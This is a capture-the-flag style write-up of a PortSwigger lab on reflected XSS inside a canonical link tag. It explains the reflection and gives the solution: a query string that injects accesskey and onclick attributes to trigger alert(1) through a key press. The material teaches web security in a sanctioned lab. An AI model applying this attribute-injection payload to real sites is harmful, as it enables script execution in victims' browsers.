# [Lab: Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)

## Lab

This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

- ALT+SHIFT+X
- CTRL+ALT+X
- Alt+X
Please note that the intended solution to this lab is only possible in Chrome.

## Analysis

```http
GET /?test HTTP/1.1
```

observer result:

```html
<link rel="canonical" href='https://id.web-security-academy.net/?test'/>
```

## Canonical

A rel=”canonical” link tag (canonical tag) is a tag used in the head section of HTML to indicate that a page overlaps another page. To indicate when a page is a duplicate of another page, you can use a `<link>` tag in the head section of your HTML.

## Solutions

```http
GET /?'accesskey%3d'x'onclick%3d'alert(1) HTTP/1.1
```

result:

```html
<link rel="canonical" href='https://id.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>
```

on Windows, press alt + shift + x combination, alert popup
